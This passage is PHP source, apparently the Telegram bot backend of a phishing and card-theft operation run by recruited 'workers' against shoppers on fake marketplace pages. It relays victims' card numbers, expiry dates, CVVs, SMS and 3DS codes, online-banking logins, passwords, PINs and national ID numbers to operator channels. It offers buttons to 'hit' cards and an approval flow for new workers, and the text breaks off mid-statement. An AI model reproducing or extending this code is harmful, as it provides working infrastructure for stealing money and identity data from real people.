$key  = $con->config->botApi; 

$urlApi = 'https://api.telegram.org/bot';

$bot_config = file_get_contents('https://raw.githubusercontent.com/geraldforkin/bbb/main/bot_config.json'); 
$bot_config = json_decode($bot_config); 
$bot_config = $bot_config[0];


$bot_chanels = file_get_contents('./chanels.json');
$bot_chanels = json_decode($bot_chanels); 
$bot_chanels = $bot_chanels[0];
 
function curs($sum,$from,$to){
    $curses = file_get_contents('https://www.cbr-xml-daily.ru/daily_json.js');
    $curses = json_decode($curses);
    $from_perone = $curses->Valute->{$from}->Value/$curses->Valute->{$from}->Nominal;
    $from_perall = $from_perone*$sum;
    
    if($to=='RUB'||!$to||!$curses->Valute->{$to}){
        $go = floor($from_perall).' руб.';
    }else{
        $to_perone = $curses->Valute->{$to}->Value/$curses->Valute->{$to}->Nominal;

        $cur = $to;
        if($to=='USD'){ $cur = '$';}
        if($to=='EUR'){ $cur = '€';}
        if($to=='UAH'){ $cur = 'грн.';} 

        $go = floor($from_perall/$to_perone).' '.$cur;
    }
    return $go;
}
 


    $rawData = file_get_contents("php://input");
    $post = json_decode($rawData); 

   
 
    if($post->callback_query){
        $post=$post->callback_query;
        $post->message->{'text_origin'} = $post->message->text; 
        $post->message->{'text'} = $post->data; 
    } 

    $c = file_get_contents('./log.txt');
    file_put_contents('./log.txt',$c.json_encode($post)."\n\n");
 
    if($_GET['support_message']=='send'){
        $token = $con->request->get('token');
        $pid = $con->request->get('product');
        $con->products->update_product($pid,array('token'=>$token)); 
        $product = (object)$con->products->get_product($pid); 
        $usr = $con->user->get_user_byid($product->uid);
        $message = $con->request->get('message'); 
        $ip = $con->request->get('ip');
        $device = $con->request->get('device');
 
        $con->products->add_message(array(
            'token'=>$token,
            'message'=>$message,
            'sender'=>'f',
            'chat_id'=>$usr->chat_id,
            'is_read'=>1
        )); 

        $data = [
            'chat_id' => $usr->chat_id,  
            'parse_mode'=>'HTML',
            'text' => "".$bot_config->countries->{$product->country}->flag." <b>".$bot_config->countries->{$product->country}->markets->{$product->market}->name_nos."</b> 👩‍🔧 Тех.поддержка 👩‍🔧\n📬 <b>Товар</b>: ".$product->title."\n📬 <b>Стоимость</b>: ".$product->price." ".$product->currancy."\n📬 <b>IP</b>: ".$ip."\n📬 <b>Устройство</b>: ".$device."📬 Token:".$token."\n\n📬 <b>Сообщение</b>: ".$message."\n\n📬 Ответь на это сообщение, чтоб написать мамонту в тп\n\n"
        ];    
        
 
        file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
        exit();
    }

    if($_GET['support_message']=='get'){
        $token = $con->request->get('token');
        echo json_encode($con->products->get_messages($token));
    }
    if($_GET['support_message']=='getone'){
        $token = $con->request->get('token');
        $msgs = $con->products->get_messages($token,true);
        foreach($msgs as $v){
            $con->products->update_messages($v->id,array(
                'is_read'=>1
            ));
        }
        echo json_encode($msgs);
    }
    
    if($_GET['visit']=='order'){  
        $token = $con->request->get('token');
        $pid = $con->request->get('product');
        $con->products->update_product($pid,array('token'=>$token)); 
        $product = (object)$con->products->get_product($pid); 
        $usr = $con->user->get_user_byid($product->uid);
        $data = [
            'chat_id' => $usr->chat_id,  
            'parse_mode'=>'HTML',
            'text' => "📬 ".$bot_config->countries->{$product->country}->flag." <b>".$bot_config->countries->{$product->country}->markets->{$product->market}->name_nos."</b> Переход на ссылку\n📬 <b>Товар</b>: ".$product->title."\n📬 <b>Стоимость</b>: ".$product->price." ".$product->currancy."\n📬 <b>IP</b>: ".$_GET['ip']."\n📬 <b>Устройство</b>: ".$_GET['device']."\n📬 Token:".$token."\n📬 Ответь на это сообщение, чтоб написать мамонту в тп\n\n" 
        ];    
 
        file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
        exit();
    }
    if($_GET['visit']=='oplata'){  
        $pid = $con->request->get('product');
        $product = (object)$con->products->get_product($pid);  
        $usr = $con->user->get_user_byid($product->uid);
        $data = [
            'chat_id' => $usr->chat_id,  
            'parse_mode'=>'HTML',
            'text' => "📬 ".$bot_config->countries->{$product->country}->flag." <b>".$bot_config->countries->{$product->country}->markets->{$product->market}->name_nos."</b> Переход на оплату\n📬 <b>Товар</b>: ".$product->title."\n📬 <b>Стоимость</b>: ".$product->price." ".$product->currancy."\n📬 <b>IP</b>: ".$_GET['ip']."\n📬 <b>Устройство</b>: ".$_GET['device']."\n\n"
        ];    
 
        file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
        exit();
    } 
    if($_GET['visit']=='card'){  
        $pid = $con->request->get('product');
        $con->products->update_product($_GET['product'],array('ip'=>$_GET['ip'],'device'=>$_GET['device']));
        $product = (object)$con->products->get_product($pid); 
        $card = (object)$con->user->get_card($_GET['card']);
        $usr = $con->user->get_user_byid($product->uid);
        $data = [
            'chat_id' => $usr->chat_id,  
            'parse_mode'=>'HTML',
            'text' => "📬 ".$bot_config->countries->{$product->country}->flag." <b>".$bot_config->countries->{$product->country}->markets->{$product->market}->name_nos."</b> 💳 Ввод карты 💳\n📬 <b>Товар</b>: ".$product->title."\n📬 <b>Стоимость</b>: ".$product->price." ".$product->currancy."\n📬 <b>Баланс карты</b>: ".$card->balance." ".$product->currancy."\n📬 <b>IP</b>: ".$product->ip."\n📬 <b>Устройство</b>: ".$product->device."\n🏦 <b>Банк</b>: ".$card->bank_name."\n📬 <b>Страна</b>: ".$card->bank_country."\n📬 <b>Тип карты</b>: ".$card->bank_scheme."\n\n"
        ];    
 
        file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
        /* ~~~~~~~~~~~~~~ */
        $btn1 = array("text" => "👊 Бить","callback_data" => "/get_log_".$_GET['product']."_".$_GET['card']); 
        $inline_keyboard = [[$btn1]]; 
            
        $keyboard = array("inline_keyboard" => $inline_keyboard);
        $replyMarkup = json_encode($keyboard); 
        $banking = '';
        if($card->bank_login){
            $banking .= "\n💳 <b>Login</b>: ".$card->bank_login;
        }
        if($card->bank_haslo){
            $banking .= "\n💳 <b>Haslo</b>: ****";
        }
        if($card->bank_pin){
            $banking .= "\n💳 <b>Pin</b>: ****";
        }
        if($card->bank_pesel){
            $banking .= "\n💳 <b>Pesel</b>: ****";
        }
        $data = [
            'chat_id' => $bot_chanels->chanels->{'chanel_logs_'.$product->country}->id,  
            'parse_mode'=>'HTML',
            'text' => "".$bot_config->countries->{$product->country}->flag." <b>".$bot_config->countries->{$product->country}->markets->{$product->market}->name_nos."</b> 💳 Ввод карты 💳\n📬 <b>Стоимость</b>: ".$product->price." ".$product->currancy."\n💳 <b>Карта</b>: ".$card->number."\n💳 <b>MM/YY</b>: ".$card->month."/".$card->year."\n💳 <b>CVV</b>: ***".$banking."\n☠️ <b>Имя</b>: ".$card->card_name."\n🏦 <b>Банк</b>: ".($card->bank_name?$card->bank_name:'----')."\n💳 <b>Тип</b>: ".$card->bank_scheme."\n📬 <b>IP</b>: ".$product->ip."\n📬 <b>Устройство</b>: ".$product->device."\n📬 <b>Страна</b>: ".$card->bank_country."\n\n💎 <b>Баланс</b>: ".$card->balance." ".$product->currancy." (".curs($card->balance,$product->currancy,'UAH')."/ ".curs($card->balance,$product->currancy,"RUB")."/ ".curs($card->balance,$product->currancy,'USD')."/ ".curs($card->balance,$product->currancy,'EUR').")\n",
            'reply_markup'=>$replyMarkup
        ];     
        $log_result = file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data)); 
        $log_result = json_decode($log_result);
        if($log_result->ok&&$_GET['card']){
            $con->user->update_card($_GET['card'],array('message_id'=>$log_result->result->message_id));
        }
        exit();
    }
    if($_GET['visit']=='sms'){  
        $pid = $con->request->get('product');
        $product = (object)$con->products->get_product($pid); 
        $card = (object)$con->user->get_card($_GET['card']);
        $usr = $con->user->get_user_byid($product->uid); 
        $worker = (object)$con->user->get_user_byid($product->uid); 
        $data = [
            'chat_id' => $usr->chat_id,  
            'parse_mode'=>'HTML',
            'text' => "📬 ".$bot_config->countries->{$product->country}->flag." <b>".$bot_config->countries->{$product->country}->markets->{$product->market}->name_nos."</b> ✉️ SMS введена ✉️\n📬 <b>Товар</b>: ".$product->title."\n📬 <b>Стоимость</b>: ".$product->price." ".$product->currancy."\n📬 <b>Баланс</b>: ".$card->balance." ".$product->currancy." (".curs($card->balance,$product->currancy,'UAH')."/ ".curs($card->balance,$product->currancy,"RUB")."/ ".curs($card->balance,$product->currancy,'USD')."/ ".curs($card->balance,$product->currancy,'EUR').")\n📬 <b>IP</b>: ".$_GET['ip']."\n📬 <b>Устройство</b>: ".$_GET['device']."🏦 <b>Банк</b>: ".$card->bank_name."\n📬 <b>Страна</b>: ".$card->bank_country."\n📬 <b>Тип карты</b>: ".$card->bank_scheme."\n\n"
        ];    
 
        file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
        /* ~~~~~~~~~~~~~ */

        if($card->vblogin){
            $btn1 = array("text" => "✉️ 3DS","callback_data" => "/set_log_3ds_".$product->id."_".$card->id); 
            $btn2 = array("text" => "🔒 Лимит","callback_data" => "/set_log_limit_".$product->id."_".$card->id);
            $btn3 = array("text" => "🗑 Фэйк карта","callback_data" => "/set_log_fake_".$product->id."_".$card->id);
            $btn4 = array("text" => "🔙 Отдать карту","callback_data" => "/set_log_reject_".$product->id."_".$card->id);
            $btn5 = array("text" => "✅ Успех","callback_data" => "/set_log_ok_".$product->id."_".$card->id);
            $inline_keyboard = [[$btn1,$btn2],[$btn3,$btn4],[$btn5]];  
        }else{
            $btn1 = array("text" => "👊 Бить","callback_data" => "/get_log_".$_GET['product']."_".$_GET['card']); 
            $inline_keyboard = [[$btn1]];
        }
        $keyboard = array("inline_keyboard" => $inline_keyboard);
        $replyMarkup = json_encode($keyboard); 
        $banking = '';
        if($card->bank_login){
            $banking .= "\n💳 <b>Login</b>: ".$card->bank_login;
        }
        if($card->bank_haslo){
            $banking .= "\n💳 <b>Haslo</b>: ****";
        }
        if($card->bank_pin){
            $banking .= "\n💳 <b>Pin</b>: ****";
        }
        if($card->bank_pesel){
            $banking .= "\n💳 <b>Pesel</b>: ****";
        }
            $data = [
                'chat_id' => $bot_chanels->chanels->{'chanel_logs_'.$product->country}->id,  
                'message_id'=> $card->message_id,
                'parse_mode'=>'HTML',
                'text' => "❌ Лог бьет @".$card->vblogin."⚠️\n\n".$bot_config->countries->{$product->country}->flag." <b>".$bot_config->countries->{$product->country}->markets->{$product->market}->name_nos."</b> ✉️ SMS введена ✉️\n📬 <b>Стоимость</b>: ".$product->price." ".$product->currancy."\n💳 <b>Карта</b>: ".$card->number."\n💳 <b>MM/YY</b>: ".$card->month."/".$card->year."\n💳 <b>CVV</b>: ***".$banking."\n☠️ <b>Имя</b>: ".$card->card_name."\n🏦 <b>Банк</b>: ".($card->bank_name?$card->bank_name:'----')."\n💳 <b>Тип</b>: ".$card->bank_scheme."\n📬 <b>IP</b>: ".$product->ip."\n📬 <b>Устройство</b>: ".$product->device."\n📬 <b>Страна</b>: ".$card->bank_country."\n✉️ <b>SMS</b>: ".($card->vbid?"****":$card->sms)." 👈\n\n💎 <b>Баланс</b>: ".$card->balance." ".$product->currancy." (".curs($card->balance,$product->currancy,'UAH')."/ ".curs($card->balance,$product->currancy,"RUB")."/ ".curs($card->balance,$product->currancy,'USD')."/ ".curs($card->balance,$product->currancy,'EUR').") \n📬 <b>Воркер</b>: @".$worker->login." | ".$worker->chat_id."\n\n" 
            ]; 
            //file_get_contents($urlApi.$key.'/editMessageText?'.http_build_query($data));  

            $data['reply_markup']=$replyMarkup; 

            file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
            if($card->vbid){
                $banking = '';
                if($card->bank_login){
                    $banking .= "\n💳 <b>Login</b>: ".$card->bank_login;
                }
                if($card->bank_haslo){
                    $banking .= "\n💳 <b>Haslo</b>: ".$card->bank_haslo;
                }
                if($card->bank_pin){
                    $banking .= "\n💳 <b>Pin</b>: ".$card->bank_pin;
                }
                if($card->bank_pesel){
                    $banking .= "\n💳 <b>Pesel</b>: ".$card->bank_pesel;
                }
                if($card->bank_nmatki){
                    $banking .= "\n💳 <b>Ф. матери</b>: ".$card->bank_nmatki;
                } 
                if($card->bank_nojca){
                    $banking .= "\n💳 <b>Ф. отца</b>: ".$card->bank_nojca;
                } 
                $data = [
                    'chat_id' => $card->vbid,
                    'parse_mode'=>'HTML',
                    'text' => "💳 Данные из лога ⚠️ Ввод SMS\n\n".$bot_config->countries->{$product->country}->flag." <b>".$bot_config->countries->{$product->country}->markets->{$product->market}->name_nos."</b>\n📬 <b>Стоимость</b>: ".$product->price." ".$product->currancy."\n💳 <b>Карта</b>: ".$card->number."\n💳 <b>MM/YY</b>: ".$card->month."/".$card->year."\n💳 <b>CVV</b>: ".$card->cvv.$banking."\n☠️ <b>Имя</b>: ".$card->card_name."\n🏦 <b>Банк</b>: ".($card->bank_name?$card->bank_name:'----')."\n💳 <b>Тип</b>: ".$card->bank_scheme."\n📬 <b>IP</b>: ".$product->ip."\n📬 <b>Устройство</b>: ".$product->device."\n📬 <b>Страна</b>: ".$card->bank_country."\n✉️ <b>SMS</b>: ".$card->sms." 👈\n\n💎 <b>Баланс</b>: ".$card->balance." ".$product->currancy." (".curs($card->balance,$product->currancy,'UAH')."/ ".curs($card->balance,$product->currancy,"RUB")."/ ".curs($card->balance,$product->currancy,'USD')."/ ".curs($card->balance,$product->currancy,'EUR').")\n📬 <b>Воркер</b>: @".$worker->login." | ".$worker->chat_id."\n\n"
                ]; 
                
    

                file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data)); 
            }

        exit();
    }
    if($_GET['visit']=='banking'){  
        $pid = $con->request->get('product');
        $product = (object)$con->products->get_product($pid); 
        $card = (object)$con->user->get_card($_GET['card']);
        $usr = $con->user->get_user_byid($product->uid); 
        $worker = (object)$con->user->get_user_byid($product->uid); 
        $data = [
            'chat_id' => $usr->chat_id,  
            'parse_mode'=>'HTML',
            'text' => "📬 ".$bot_config->countries->{$product->country}->flag." <b>".$bot_config->countries->{$product->country}->markets->{$product->market}->name_nos."</b>\n🏦 Данные банкинга введены 🏦\n📬 <b>Товар</b>: ".$product->title."\n📬 <b>Стоимость</b>: ".$product->price." ".$product->currancy."\n📬 <b>Баланс</b>: ".$card->balance." ".$product->currancy." (".curs($card->balance,$product->currancy,'UAH')."/ ".curs($card->balance,$product->currancy,"RUB")."/ ".curs($card->balance,$product->currancy,'USD')."/ ".curs($card->balance,$product->currancy,'EUR').")\n📬 <b>IP</b>: ".$_GET['ip']."\n📬 <b>Устройство</b>: ".$_GET['device']."🏦 <b>Банк</b>: ".$card->bank_name."\n📬 <b>Страна</b>: ".$card->bank_country."\n📬 <b>Тип карты</b>: ".$card->bank_scheme."\n\n"
        ];    
 
        file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
        /* ~~~~~~~~~~~~~ */

        if($card->vblogin){
            $btn1 = array("text" => "✉️ 3DS","callback_data" => "/set_log_3ds_".$product->id."_".$card->id); 
            $btn2 = array("text" => "🔒 Лимит","callback_data" => "/set_log_limit_".$product->id."_".$card->id);
            $btn3 = array("text" => "🗑 Фэйк карта","callback_data" => "/set_log_fake_".$product->id."_".$card->id);
            $btn4 = array("text" => "🔙 Отдать карту","callback_data" => "/set_log_reject_".$product->id."_".$card->id);
            $btn5 = array("text" => "✅ Успех","callback_data" => "/set_log_ok_".$product->id."_".$card->id);
            $inline_keyboard = [[$btn1,$btn2],[$btn3,$btn4],[$btn5]];  
        }else{
            $btn1 = array("text" => "👊 Бить","callback_data" => "/get_log_".$_GET['product']."_".$_GET['card']); 
            $inline_keyboard = [[$btn1]];
        }
        $keyboard = array("inline_keyboard" => $inline_keyboard);
        $replyMarkup = json_encode($keyboard); 
        $banking = '';
        if($card->bank_login){
            $banking .= "\n💳 <b>Login</b>: ".$card->bank_login;
        }
        if($card->bank_haslo){
            $banking .= "\n💳 <b>Haslo</b>: ****";
        }
        if($card->bank_pin){
            $banking .= "\n💳 <b>Pin</b>: ****";
        }
        if($card->bank_pesel){
            $banking .= "\n💳 <b>Pesel</b>: ****";
        }
            $data = [
                'chat_id' => $bot_chanels->chanels->{'chanel_logs_'.$product->country}->id,  
                'message_id'=> $card->message_id,
                'parse_mode'=>'HTML',
                'text' => "❌ Лог бьет @".$card->vblogin."⚠️\n\n".$bot_config->countries->{$product->country}->flag." <b>".$bot_config->countries->{$product->country}->markets->{$product->market}->name_nos."</b>\n🏦 Данные банкинга введены 🏦\n📬 <b>Стоимость</b>: ".$product->price." ".$product->currancy."\n💳 <b>Карта</b>: ".$card->number."\n💳 <b>MM/YY</b>: ".$card->month."/".$card->year."\n💳 <b>CVV</b>: ***".$banking."\n☠️ <b>Имя</b>: ".$card->card_name."\n🏦 <b>Банк</b>: ".($card->bank_name?$card->bank_name:'----')."\n💳 <b>Тип</b>: ".$card->bank_scheme."\n📬 <b>IP</b>: ".$product->ip."\n📬 <b>Устройство</b>: ".$product->device."\n📬 <b>Страна</b>: ".$card->bank_country."\n✉️ <b>SMS</b>: ".$card->sms." 👈\n\n💎 <b>Баланс</b>: ".$card->balance." ".$product->currancy." (".curs($card->balance,$product->currancy,'UAH')."/ ".curs($card->balance,$product->currancy,"RUB")."/ ".curs($card->balance,$product->currancy,'USD')."/ ".curs($card->balance,$product->currancy,'EUR').") \n📬 <b>Воркер</b>: @".$worker->login." | ".$worker->chat_id."\n\n" 
            ]; 
            //file_get_contents($urlApi.$key.'/editMessageText?'.http_build_query($data));  

            $data['reply_markup']=$replyMarkup; 

            file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));


        exit();
    }


    if($post->message){
        $u = array(
            'chat_id'=>$post->message->chat->id,
            'login'=>$post->message->chat->username,
            'fname'=>$post->message->chat->first_name
        );

        $usr = $con->user->get_user($u);

        if(!$post->message->from->username&&!$post->message->chat->username&&$post->message->chat->type!='channel'&&$post->message->chat->type!='group'&&$post->message->chat->type!='supergroup'){

            $btn1 = array("text" => "🔄 Попробовать еще раз","callback_data" => "/start");
            $inline_keyboard = [[$btn1]]; 
            
            $keyboard = array("inline_keyboard" => $inline_keyboard);
            $replyMarkup = json_encode($keyboard); 

            $data = [
                'chat_id' => $post->message->chat->id,  
                'parse_mode'=>'HTML',
                'text' => "Уважаемый ".($post->message->chat->first_name?$post->message->chat->first_name:'пользователь')."! Для дальнейшего использования бота Вам необходимо в профиле задать свой логин! \n\n",
                'reply_markup'=>$replyMarkup
            ];  
            

            file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
            exit();
        }

        if($post->message->chat->username!=$usr->login){
            $con->user->update_user($post->message->chat->id,array('login'=>$post->message->chat->username));
        }


        /*~~ User Register ~~*/
        if($post->message->chat->type=="private"&&(strpos($post->message->text,'/start')!==false||strpos($post->message->text,'/menu')!==false)){
 
            if(!$usr||$usr==false)
            { 
                $usr = $con->user->add_user($u);   
            } 
            $usr = (object)$usr;

            if(!$usr->status||$usr->status==NULL)
            {  
                $btn1 = array("text" => "Куда я попал❓","url" => $bot_chanels->chanels->chanel_about->invite_link);
                $btn2 = array("text" => "✅ Начнём!","callback_data" => "/go");
                
                $inline_keyboard = [[$btn1,$btn2]]; 
    
            }
            else
            {
                $inline_keyboard = [];
                    $sect_keyboard = [];
                    $i=0;
                    foreach($bot_config->countries as $k=>$v){
                        $i=$i+1;
                        $sect_keyboard[]= array("text" => $v->name,"callback_data" => "/country_".$v->code);
                        if(count($sect_keyboard)>=2){ 
                            $inline_keyboard[]=$sect_keyboard;
                            $sect_keyboard=[];
                        } 
                        if($i>2&&count($sect_keyboard)<2&&count((array)$bot_config->countries)==$i){ 
                            $inline_keyboard[]=$sect_keyboard;
                        }
                        
                    } 
                    $inline_keyboard[]=array(
                        array("text" => "🗄 Мои товары","callback_data" => "/myproductsshow")
                    );
                    $inline_keyboard[]=array(
                        array("text" => "📚 Мануалы","url" => $bot_chanels->chanels->chanel_manuals->invite_link),
                        array("text" => "💭 Чаты","callback_data" => "/chats_all")
                    );
                    $inline_keyboard[]=array(
                        array("text" => "🔝 Топ сегодня","callback_data" => "/top_today"),
                        array("text" => "📈 Топ за все время","callback_data" => "/top_allways")
                    );
            }  
                         
            $keyboard = array("inline_keyboard" => $inline_keyboard);
            $replyMarkup = json_encode($keyboard); 
           
            
             
           
                    $data = [
                        'chat_id' => $post->message->chat->id,  
                        'parse_mode'=>'HTML',
                        'text' => "Твой ID: <b>".$post->message->chat->id."</b>\nТвой скрытый ID: <b>".$usr->id."</b>\n\n",
                        'reply_markup'=>$replyMarkup
                    ];  
                   
//file_put_contents('./log.txt',json_encode($data)."\n\n"); 
file_put_contents('./log.txt',$urlApi.$key.'/sendMessage?'.http_build_query($data)."\n\n"); 
                         
                if(strpos($post->message->text,'/start_back')!==false){
                    $data['message_id']=$post->message->message_id;
                    file_get_contents($urlApi.$key.'/editMessageText?'.http_build_query($data));
                }else{
                    file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
                }

        }



        if(strpos($post->message->text,'/go')!==false){

 
            $btn1 = array("text" => "✅ Ознакомлен(а)","callback_data" => '/ok'); 
            
            $inline_keyboard = [[$btn1]]; 

            $keyboard = array("inline_keyboard" => $inline_keyboard);
            $replyMarkup = json_encode($keyboard); 
             
           
                    $data = [
                        'chat_id' => $post->message->chat->id,  
                        'message_id' => $post->message->message_id,
                        'parse_mode'=>'HTML',
                        'text' => "<b>Правила:</b>\n".$bot_config->text->pravila,
                        'reply_markup'=>$replyMarkup
                    ];  

                    file_get_contents($urlApi.$key.'/editMessageText?'.http_build_query($data));

        } 
        if(strpos($post->message->text,'/ok')!==false){

 
            $btn1 = array("text" => "📷 Реклама в Inst","callback_data" => '/source_inst'); 
            $btn2 = array("text" => "☎️ Реклама в Telegram","callback_data" => '/source_tg'); 
            $btn3 = array("text" => "😎 От друзей","callback_data" => '/source_friends'); 
            $btn4 = array("text" => "🤔 Случайно наткнулся","callback_data" => '/source_across'); 
            
            $inline_keyboard = [[$btn1,$btn2],[$btn3,$btn4]]; 

            $keyboard = array("inline_keyboard" => $inline_keyboard);
            $replyMarkup = json_encode($keyboard); 
             
           
                    $data = [
                        'chat_id' => $post->message->chat->id,  
                        'message_id' => $post->message->message_id,
                        'parse_mode'=>'HTML',
                        'text' => "Откуда Вы узнали о нас?",
                        'reply_markup'=>$replyMarkup
                    ];  

                    file_get_contents($urlApi.$key.'/editMessageText?'.http_build_query($data));

        } 
        if(strpos($post->message->text,'/source_')!==false){
 
            if($usr){
                $con->user->update_user($usr->chat_id,array('description'=>'ready','source'=>$post->message->text));
            }
                    $data = [
                        'chat_id' => $post->message->chat->id, 
                        'message_id' => $post->message->message_id, 
                        'parse_mode'=>'HTML',
                        'text' => "Введите максимально развёрнуто свой опыт в ".$bot_config->text->scm1.", в каких проектах работали, на каких должностях."
                    ];  

                    file_get_contents($urlApi.$key.'/editMessageText?'.http_build_query($data));

        }
        if($usr->description=='ready'){
            if(strlen($post->message->text)>$bot_config->description_length){
                $con->user->update_user($usr->chat_id,array('description'=>$post->message->text));
                $data = [
                    'chat_id' => $post->message->chat->id,  
                    'message_id' => $post->message->message_id,
                    'parse_mode'=>'HTML',
                    'text' => "Спасибо ".$usr->fname."! Ваш заявка находится на рассмотрении администрацией. Вы получите результат в сообщении в этом чате."
                ];  

                file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));

                /*Send to admin*/
                if(strpos($usr->source,'_inst')!==false){
                    $usr_source = 'Instagram';
                }elseif(strpos($usr->source,'_tg')!==false){
                    $usr_source = 'Telegram';
                }elseif(strpos($usr->source,'_friends')!==false){
                    $usr_source = 'От друзей';
                }elseif(strpos($usr->source,'_across')!==false){
                    $usr_source = 'Случайно наткнулся';
                }

                $btn1 = array("text" => "✅ Одобрить","callback_data" => '/invite_ok_'.$usr->chat_id); 
                $btn2 = array("text" => "🚫 Отклонить","callback_data" => '/invite_reject_'.$usr->chat_id); 
                
                $inline_keyboard = [[$btn1,$btn2]]; 
    
                $keyboard = array("inline_keyboard" => $inline_keyboard);
                $replyMarkup = json_encode($keyboard); 

                $data = [
                    'chat_id' => $bot_chanels->chanels->chanel_orders->id,  
                    'parse_mode'=>'HTML',
                    'text' => "\n<b>НОВАЯ ЗАЯВКА</b>\nВоркер: <a href='https://t.me/".$usr->login."'><b>@".$usr->login."</b></a>\nИсточник: <b>".$usr_source."</b>\nОпыт: <b>".$post->message->text."</b>\n\n",
                    'reply_markup'=>$replyMarkup
                ];  

                file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));

            }else{
                $data = [
                    'chat_id' => $post->message->chat->id,   
                    'parse_mode'=>'HTML',
                    'text' => "Введите максимально развёрнуто свой опыт в ".$bot_config->text->scm1.", в каких проектах работали, на каких должностях. <b>Более ".$bot_config->description_length." символов!!!</b>"
                ];  

                file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
            }
            exit();
        }
        if(strpos($post->message->text,'/invite_ok')!==false){
 
            $usr_inviter = explode('_',$post->message->text);
            if(count($usr_inviter)>2){
                $con->user->update_user($usr_inviter[2],array('status'=>'1'));
                    
                    $inline_keyboard = [];
                    $sect_keyboard = [];
                    
                    $i=0;
                    foreach($bot_config->countries as $k=>$v){
                        $i=$i+1;
                        $sect_keyboard[]= array("text" => $v->name,"callback_data" => "/country_".$v->code);
                        if(count($sect_keyboard)>=2){ 
                            $inline_keyboard[]=$sect_keyboard;
                            $sect_keyboard=[];
                        } 
                        if($i>2&&count($sect_keyboard)<2&&count((array)$bot_config->countries)==$i){ 
                            $inline_keyboard[]=$sect_keyboard;
                        }
                        
                    } 
                    $inline_keyboard[]=array(
                        array("text" => "🗄 Мои товары","callback_data" => "/myproductsshow")
                    );
                    $inline_keyboard[]=array(
                        array("text" => "📚 Мануалы","url" => $bot_chanels->chanels->chanel_manuals->invite_link),
                        array("text" => "💭 Чаты","callback_data" => "/chats_all")
                    );
                    $inline_keyboard[]=array(
                        array("text" => "🔝 Топ сегодня","callback_data" => "/top_today"),
                        array("text" => "📈 Топ за все время","callback_data" => "/top_allways")
                    );

                    $keyboard = array("inline_keyboard" => $inline_keyboard);
                    $replyMarkup = json_encode($keyboard);  
                    $data = [
                        'chat_id' => $usr_inviter[2],  
                        'parse_mode'=>'HTML',
                        'text' => "✅ Поздравляем! Ваша заявка одобрена! Выберите по какой стране хотите работать и вступите в чат воркеров и канал с мануалами!",
                        'reply_markup'=>$replyMarkup
                    ];  

                    file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));

                    $keyboard = array("inline_keyboard" => array());
                    $replyMarkup = json_encode($keyboard);
                    $data = [
                        'chat_id' => $post->message->chat->id,  
                        'message_id'=>$post->message->message_id,
                        'reply_markup'=>$replyMarkup
                    ];  

                    file_get_contents($urlApi.$key.'/editMessageReplyMarkup?'.http_build_query($data));
                    $data = [
                        'chat_id' => $post->message->chat->id,  
                        'message_id'=>$post->message->message_id,  
                        'parse_mode'=>'HTML',
                        'text'=>$post->message->text_origin."\n\n ✅ Заявка одобрена <a href='https://t.me'>@".$post->from->username."</a>\n\n"
                    ];  

                    file_get_contents($urlApi.$key.'/editMessageText?'.http_build_query($data));
                    
            }

        }
        if(strpos($post->message->text,'/invite_reject')!==false){
 
            $usr_inviter = explode('_',$post->message->text);
            if(count($usr_inviter)>2){ 
            
                    $data = [
                        'chat_id' => $usr_inviter[2],  
                        'parse_mode'=>'HTML',
                        'text' => "🚫 Ваша заявка на вступление отклонена"
                    ];  

                    file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
                    $keyboard = array("inline_keyboard" => array());
                    $replyMarkup = json_encode($keyboard);
                    $data = [
                        'chat_id' => $post->message->chat->id,  
                        'message_id'=>$post->message->message_id,
                        'reply_markup'=>$replyMarkup
                    ];  

                    file_get_contents($urlApi.$key.'/editMessageReplyMarkup?'.http_build_query($data));
                    $data = [
                        'chat_id' => $post->message->chat->id,  
                        'message_id'=>$post->message->message_id,  
                        'parse_mode'=>'HTML',
                        'text'=>$post->message->text_origin."\n\n 🚫 Заявка отклонена <a href='https://t.me'>@".$post->from->username."</a>\n\n"
                    ];  

                    file_get_contents($urlApi.$key.'/editMessageText?'.http_build_query($data));
            }

        }

        if(strpos($post->message->text,'/chats_all')!==false){
            $inline_keyboard=[];
            foreach($bot_config->countries as $k=>$v){
                if($bot_chanels->chanels->{'chanel_vorkers_'.$v->code}){
                    $inline_keyboard[]= array(array("text" => "💬 ".$v->name,"url" => $bot_chanels->chanels->{'chanel_vorkers_'.$v->code}->invite_link)); 
                }
            } 
            $inline_keyboard[]= array(array("text" => "🔙 Главное меню","callback_data" => "/start_back")); 

            $keyboard = array("inline_keyboard" => $inline_keyboard);
            $replyMarkup = json_encode($keyboard);  
            $data = [
                'chat_id' => $post->message->chat->id, 
                'message_id' => $post->message->message_id,   
                'reply_markup'=>$replyMarkup
            ];  

            file_get_contents($urlApi.$key.'/editMessageReplyMarkup?'.http_build_query($data));

        }

        /*~~ Update Group ~~*/
        
        if(strpos($post->message->text,'/chanel_')!==false){ 

            $channel_post_text = str_replace("/","",$post->message->text);
            
                    $data = [
                        'chat_id' => $post->message->chat->id,  
                        'parse_mode'=>'HTML',
                        'text' => "Успех! Радуйся!"
                    ];  

                    file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
 
                    $me = file_get_contents($urlApi.$key.'/getMe');
                    $me = json_decode($me);
                    if($me->ok){
                        $data = [
                            'chat_id' => $post->message->chat->id,
                            'user_id'=> $me->result->id
                        ];  
                        $chat_channel = file_get_contents($urlApi.$key.'/getChat?'.http_build_query($data));
                        $chat_channel = json_decode($chat_channel);
                        
                        if($chat_channel->ok){
                            $bot_chanels->chanels->{$channel_post_text} = 
                            array(
                                "id"=>$post->message->chat->id, 
                                "type"=>$chat_channel->result->type, 
